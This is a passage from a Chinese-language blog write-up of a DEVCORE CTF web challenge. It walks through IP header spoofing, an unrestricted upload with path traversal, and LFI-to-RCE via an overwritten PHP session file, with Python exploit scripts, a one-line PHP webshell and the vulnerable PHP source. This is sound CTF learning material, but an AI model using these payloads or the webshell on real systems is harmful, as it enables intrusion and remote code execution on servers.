</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">session_start_once</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">get_client_ip</span><span class="p">(),</span> <span class="p">[</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;172.18.11.89&#39;</span><span class="p">],</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">endsWith</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_FILENAME&#39;</span><span class="p">],</span> <span class="s1">&#39;login.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /b8ck3nd/login.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>下一步就是想辦法偽造 IP 戳後台頁面，最直觀的方法就是用 Burp 直接攔截封包改 header，但是嘗試一段時間雖然能摸到登入頁面，但發現效果不彰，除了找不到 Auto add parameter 的方式要一直手動複製貼上，很多時候封包送出去後網站還是繼續轉圈圈，之後改用 Google 套件 <a href="https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj/" target="_blank" rel="noopener noreffer ">ModHeader</a>，真的方便！</p>
<p>再來後台帳號密碼，可以從 弱點 3 的 SQLi 的 backend_users 拿到，順利登入後就能直接看到 flag 了。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-flag4.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-flag4.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-flag4.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-flag4.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-flag4.webp"
        title=" " /></p>
<h3 id="弱點-5unrestricted-file-upload">弱點 5：Unrestricted File Upload</h3>
<p>在 LFI 翻找 source code 的過程可以找到 <code>/b8ck3nd/upload.php</code>，原本用途應該是上傳圖片，但沒意外這裡應該是讓我們塞後門用的XD</p>
<div class="highlight" filename="/b8ck3nd/upload.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;include.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/plain&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/json; charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">random_str</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;folder&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$folder</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;folder&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">IMAGE_PATH</span><span class="o">.</span><span class="nv">$folder</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">mkdir</span><span class="p">(</span><span class="nx">IMAGE_PATH</span><span class="o">.</span><span class="nv">$folder</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$folder</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filepath</span> <span class="o">=</span> <span class="nx">IMAGE_PATH</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$filepath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;rsync_wrap &#34;</span><span class="o">.</span><span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nx">base64_urlsafe_encode</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/image.php?id=&#39;</span><span class="o">.</span><span class="nv">$id</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">http_response_code</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>從 source code 可以看到若用 <code>GET</code> 的方式上傳會噴一串 JWT 給你，這邊直接用 python requests 上傳檔案。由於同樣會先過 <code>include.php</code> 的檢查，所以參數的部分該給的 IP 和 cookies 記得要放，這裡我是手動 admin 登入後再複製 cookies，想想應該有更好的寫法。</p>
<p>另外，從 line 15 - 23 可以發現系統允許我們<strong>自訂檔名</strong>還有<strong>上傳 folder</strong>，原本我還傻傻的想說用不到就沒注意，直到後面戳不出來，Arikoi 就問了句「如果可以上傳 folder，那你要不要試試上傳點點斜」 &hellip;&hellip; 真是好主意呢，結果只要把檔案存在非預設路徑（<code>/images/</code>），flag 就會自己噴出來（比想像中還快==），另外下面路徑就能透過 LFI 進行確認上傳的檔案。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638291731/blog-posts/2021-12/01-flag5.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638291731/blog-posts/2021-12/01-flag5.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638291731/blog-posts/2021-12/01-flag5.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638291731/blog-posts/2021-12/01-flag5.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638291731/blog-posts/2021-12/01-flag5.webp"
        title=" " /></p>
<p>（當時的 code 僅供參考）</p>
<div class="highlight" filename="backdoor.py"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://web.ctf.devcore.tw/b8ck3nd/upload.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="s1">&#39;172.18.11.89&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;PHPSESSID&gt;&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.php&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;folder&#39;</span><span class="p">:</span> <span class="s1">&#39;../tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;rename&#39;</span><span class="p">:</span> <span class="s1">&#39;test.php&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="弱點-6local-file-inclusion">弱點 6：Local File Inclusion</h3>
<p>雖然說是這麼說，但上面的做法透過 LFI 進行確認上傳檔案會發現是 404，同時上傳到 <code>/frontend/</code> 或 <code>/b8ck3nd/</code> 也是一樣的情況，表示除了 <code>/images/</code> 以外都不給上傳檔案（從 <code>/proc/mounts</code> 其實也可以看到前後端的目錄都是 read-only 不給寫檔），也難怪上一題除了噴 flag 還問了一句</p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Warning<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Now, can you get shell?</div>
        </div>
    </div>
<blockquote>
<p>戳不到後門，那到底還有哪裡可以放檔案呢？</p>
</blockquote>
<p>這是我當時心中的疑問，從滲透測試報告的弱點 5 其實有暗示 <code>/tmp/pwn.php</code>，動手實驗後也確認可以上傳檔案（但不能直接存取），不過對於如何操作所謂的 &ldquo;<strong>RCE</strong>&rdquo; 就很陌生了。我平常 CTF 都只能戳戳簡單的小兒科，鮮少摸到複雜的 WebSec，因此對於這 RCE 整個過程是相當模糊的。</p>
<p>這裡我參考了兩篇文章 from RCE to LFI 的文章：</p>
<ul>
<li><a href="https://cyku.tw/lfi-leads-to-rce-via-session-file/" target="_blank" rel="noopener noreffer ">透過 LFI 引入 PHP session 檔案觸發 RCE</a></li>
<li><a href="https://www.rcesecurity.com/2017/08/upgrade-from-lfi-to-rce-via-php-sessions/" target="_blank" rel="noopener noreffer ">Upgrade from LFI to RCE via PHP Sessions</a></li>
</ul>
<p>其實重點在於登入後系統會在 server 端啟用 session 功能（預設路徑為 <code>/tmp/sess_{SESSIONID}</code> ），先隨意用一組 cookies 透過 LFI 看到內容是 <code>lang|s:5:&quot;zh-tw&quot;;user_id|s:1:&quot;1&quot;;</code>，根據上面第二篇的說法，可以嘗試從 lang 下手。</p>
<p>回頭看看 <code>/frontend/include.php</code>，可以發現似乎在 session 有些線索可循，包括預設會透過 <code>require_once</code> 引入 <code>langs/zh-tw.php</code>，不過載下來是個空檔案，當時我的思路卡在這裡， @stavhaygn 還打趣的表示「官方感覺就是故意引導你，告訴你這裡怪怪的ㄡ」。</p>
<div class="highlight" filename="/frontend/include.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DEFAULT_LANGUAGE&#39;</span><span class="p">,</span> <span class="s1">&#39;zh-tw&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;ALLOWED_LANGUAGE&#39;</span><span class="p">,</span> <span class="s1">&#39;zh-tw&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">session_start_once</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">session_start_once</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">DEFAULT_LANGUAGE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;langs/&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<p>這裡我大概陷入約 2 小時的撞牆期，因為沒搞懂 RCE 後門的操作方式，所以一直想把 webshell 塞到 <code>/tmp/sess_{SESSIONID}</code>，然後再透過 LFI 主動去執行後門，最後證明想法接近但使用後門的方式不對。</p>
<p>整理之後思路大致如下，由於每一次請求都會先執行 <code>require_once('include.php');</code>，而 language 會根據 session 決定要載入哪個 <code>langs/</code> 的 PHP 檔，若能夠利用這個&quot;載入 PHP&quot;的漏洞把 <code>zh-tw.php</code> 換成 <code>shell.php</code> 之類的，就能執行程式達成我們要的 RCE 。</p>
<p>但該怎麼做呢？
我想這部分可以分成 <strong>上傳後門</strong> 和 <strong>使用後門</strong> ，而這兩部分都會透過 <code>upload.php</code> 操作。</p>
<h4 id="1-上傳後門">(1) 上傳後門</h4>
<p>code 其實都差不多，後門的上傳位置我放在伺服器的 <code>/tmp/cyris.php</code>，只要能戳到就好。
（本機端 <code>test.php</code> 的內容可以先放個 <code>&lt;?php system(&quot;ls -al&quot;); ?&gt;</code> 或 <code>&lt;?php phpinfo(); ?&gt;</code> 方便確定結果）</p>
<div class="highlight" filename="backdoor.py"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie</span> <span class="o">=</span> <span class="s1">&#39;&lt;PHPSESSID&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://web.ctf.devcore.tw/b8ck3nd/upload.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="s1">&#39;172.18.11.89&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.php&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;folder&#39;</span><span class="p">:</span> <span class="s1">&#39;../../../../../../tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;rename&#39;</span><span class="p">:</span> <span class="s1">&#39;cyris.php&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>P.S. 很想用 cyris.php 在 DEVCORE 機器內留名的我</p>
</blockquote>
<h4 id="2-使用後門">(2) 使用後門</h4>
<p>有了後門，那就要想辦法觸發！
這裡我們自己寫個 <code>sesseion</code> 檔案把伺服器內的 <code>/tmp/sess_{SESSIONID}</code> 覆寫成我們的形狀w，內容大概像這樣 <code>lang|s:27:&quot;../../../../../../tmp/cyris&quot;;user_id|s:1:&quot;1&quot;;</code> 注意除了格式要對，也要是能戳到後門的路徑。</p>
<div class="highlight" filename="exploit.py"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie</span> <span class="o">=</span> <span class="s1">&#39;&lt;PHPSESSID&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://web.ctf.devcore.tw/b8ck3nd/upload.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="s1">&#39;172.18.11.89&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;folder&#39;</span><span class="p">:</span> <span class="s1">&#39;../../../../../../tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;rename&#39;</span><span class="p">:</span> <span class="s1">&#39;sess_&#39;</span><span class="o">+</span><span class="n">cookie</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>沒意外直接 LFI 就能看到結果。
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638297938/blog-posts/2021-12/01-rce.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638297938/blog-posts/2021-12/01-rce.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638297938/blog-posts/2021-12/01-rce.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638297938/blog-posts/2021-12/01-rce.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638297938/blog-posts/2021-12/01-rce.webp"
        title=" " /></p>
<p>之後就能一路透過後門找 flag，可以用 <code>&lt;?php system($_GET['cmd']); ?&gt;</code> 就可以直接用 GET 下指令，例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://web.ctf.devcore.tw/image.php?id=&lt;filepath_base64&gt;&amp;cmd=../../../../readflag2
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340322/blog-posts/2021-12/01-flag6.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340322/blog-posts/2021-12/01-flag6.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340322/blog-posts/2021-12/01-flag6.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340322/blog-posts/2021-12/01-flag6.webp 2x"
        data-sizes="auto"
